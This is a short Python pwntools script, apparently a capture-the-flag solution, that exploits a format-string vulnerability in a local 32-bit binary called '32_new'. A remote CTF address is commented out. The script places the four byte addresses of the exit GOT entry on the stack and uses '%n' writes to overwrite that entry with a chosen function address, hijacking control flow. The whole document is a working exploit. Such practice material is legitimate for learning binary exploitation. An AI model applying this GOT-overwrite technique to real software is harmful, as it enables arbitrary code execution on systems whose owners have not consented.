#!/usr/bin/python

from pwn import *
context.update(arch="i386")

#r = remote("163.172.176.29",9035)
r = process("./32_new")
print r.recvuntil("\n")

exit_GOT = 0x804a034

payload = ""
payload += p32(exit_GOT+0)
payload += p32(exit_GOT+1)
payload += p32(exit_GOT+2)
payload += p32(exit_GOT+3)

payload += "A"*24
payload += "%157x%10$n" # \x0b
payload += "%124x%11$n" # \x87
payload += "%125x%12$n" # \x04
payload += "%260x%13$n" # \x08

r.sendline(payload)
print r.readall()

